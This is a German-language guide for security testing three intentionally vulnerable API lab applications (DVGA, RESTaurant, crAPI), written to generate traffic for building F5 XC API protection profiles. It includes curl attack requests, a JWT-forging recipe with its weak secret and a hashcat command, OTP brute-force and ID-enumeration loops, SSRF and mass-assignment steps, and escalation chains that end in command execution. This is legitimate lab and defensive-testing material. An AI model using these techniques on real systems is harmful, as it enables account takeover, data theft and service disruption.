...
Dieser Leitfaden katalogisiert jeden API-Endpunkt, jede beabsichtigte Schwachstelle und jeden Angriffs-Payload über die drei API-Sicherheitstest-Anwendungen hinweg. Verwenden Sie ihn, um Traffic-Generierungsmuster für die Entwicklung von F5 XC API-Schutzprofilen zu erstellen.

| Anwendung | Protokoll | Pfad | Port | Auth | Schwachstellen |
|---|---|---|---|---|---|
| **DVGA** | GraphQL | `/dvga/` | 80 | Keine (Admin: admin/password) | 25 Szenarien |
| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (form-encoded) | 7 OWASP API 2023 Kategorien |
...
| `systemHealth` | Query | Nein | Gesundheitsprüfung |
| `systemUpdate` | Query | Nein | Langsame Abfrage (~82s, DoS-Vektor) |
| `systemDiagnostics(cmd)` | Query | admin/password | Ausführung von Whitelist-OS-Befehlen |
...
**Introspektion (vollständige Schema-Aufzählung):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**Beliebiges Dateischreiben über uploadPaste (Path Traversal):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
**Auth:** JWT über form-encoded POST an `/restaurant/token`
...
# JWT-Token abrufen (HINWEIS: form-encoded, nicht JSON)
...
| `/restaurant/reset-password` | POST | Nein | — | Passwort-Zurücksetzungsanfrage |
...
#### API1:2023 — Fehlerhafte Autorisierung auf Objektebene (BOLA)
...
**Bestellungen anderer Benutzer einsehen (Offset aufzählen):**
```bash
...
**JWT-Brute-Force mit schwachem Geheimnis (Geheimnis ist 6 Ziffern: 97952):**
```bash
# Tokens auf jwt.io dekodieren und fälschen
# Geheimnis: 97952 (per Brute-Force mit hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' knackbar)

# Chef-Token fälschen:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# Signieren mit Geheimnis: 97952
```

#### API3:2023 — Fehlerhafte Autorisierung auf Objekt-Eigenschaftsebene (BOPLA)

**Massen-Rollenzuweisung von Customer zu Chef:**
```bash
...
#### API5:2023 — Fehlerhafte Autorisierung auf Funktionsebene (BFLA)

**Menüeintrag als Customer löschen (sollte Employee+ erfordern):**
```bash
...
#### API7:2023 — Serverseitige Anfragenfälschung (SSRF)
...
# 4. Erneut authentifizieren, um Chef-Token zu erhalten
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")
...
| `/identity/api/auth/v2/check-otp` | POST | Nein | **Kein Rate-Limit** (Brute-Force für 4-stelliges OTP) |
...
| `/identity/api/v2/user/videos/{id}` | PUT | Ja | **Massen-Zuweisung** (Command Injection) |
...
| `/workshop/api/shop/orders/{id}` | PUT | Ja | **Massen-Zuweisung** (Status, Menge) |
...
```bash
# Zuerst die eigene Fahrzeug-UUID abrufen
...
#### Herausforderung 2 — BOLA: Mechaniker-Berichte abrufen (ohne Auth)

```bash
# Sequenzielle ID-Aufzählung — kein Token erforderlich
for i in 1 2 3 4 5; do
  echo "Bericht $i:"
...
#### Herausforderung 3 — Fehlerhafte Auth: Brute-Force der Passwort-Zurücksetzungs-OTP

```bash
# OTP für das Opfer anfordern
curl -X POST ${CRAPI}/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# 4-stellige OTP per Brute-Force knacken (v2 hat KEIN Rate-Limiting)
...
#### Herausforderung 4 — Datenoffenlegung: Mechaniker-E-Mails preisgeben
...
#### Herausforderung 6 — DoS: Layer 7 über Mechaniker kontaktieren
...
#### Herausforderungen 8 & 9 — Massen-Zuweisung: Kostenlose Artikel durch Bestellmanipulation
...
#### Herausforderung 11 — SSRF über Mechaniker kontaktieren
...
```bash
# Kein Authorization-Header — gibt trotzdem Daten zurück
for i in 1 2 3 4 5; do
...
| **API2: Fehlerhafte Auth** | JWT-Fälschung (`me`-Query) | JWT schwaches Geheimnis (97952) | OTP-Brute-Force (v2), JWT-Algorithmus-Verwechslung |
| **API3: BOPLA** | — | `PATCH /profile` (Rolleneskalation) | Video conversion_params, Mechaniker-E-Mail-Offenlegung |
| **API4: Ressourcenverbrauch** | Batch-, Rekursions-, Alias-, Feld-Duplizierungs-DoS | Benutzeraufzählung über Antwortlänge | `contact_mechanic` repeat_request DoS |
| **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | `DELETE /admin/videos` als regulärer Benutzer |
| **API6: Massen-Zuweisung** | — | `PUT /orders` (Status, Menge) | Bestellstatus/-menge, Video conversion_params |
...
| **API9: Unzureichendes Asset-Management** | — | — | Veraltetes `/auth/v2/check-otp` (kein Rate-Limit) |
| **API10: Unsicherer Verbrauch** | — | — | (indirekt über SSRF) |
| **GraphQL-spezifisch** | Introspektion, Batching, Rekursion, Aliase, Feld-Duplizierung, zirkuläre Fragmente | — | — |
...
Generieren Sie legitimen Traffic, um normales API-Verhalten zu etablieren, bevor Angriffsmuster getestet werden.
...
**BOLA-Tests:** Sequenzielle IDs aufzählen, Benutzerkennungen in Anfragen austauschen, auf Ressourcen ohne Eigentumsrecht zugreifen.

**Injection-Tests:** SQL-Payloads in Filter-/Gutschein-Parametern, GraphQL-Query-Injection, OS-Command-Injection über Parameter-Felder.

**Auth-Bypass-Tests:** JWT-Token fälschen, OTPs per Brute-Force knacken, veraltete API-Versionen verwenden, Algorithmus-Verwechslung.
...
Einige Angriffe erfordern mehrstufige Sequenzen mit Zustandsverwaltung:

1. **RESTaurant-Eskalationskette:** Registrieren → Token → PATCH-Rolle zu Chef → Erneute Auth → Command Injection
2. **crAPI-Gesamtablauf:** Anmeldung → E-Mail verifizieren (MailHog) → Anmelden → Fahrzeug hinzufügen → Mechaniker kontaktieren (SSRF) → Bestellmanipulation
3. **DVGA Aufklärung-zu-Exploit:** Introspektion → systemDiagnostics entdecken → Admin-Anmeldedaten per Brute-Force → OS-Befehlsausführung
...
| BOLA-Aufzählung | 100-500 | 2 Min | Sequenzielles ID-Scanning |
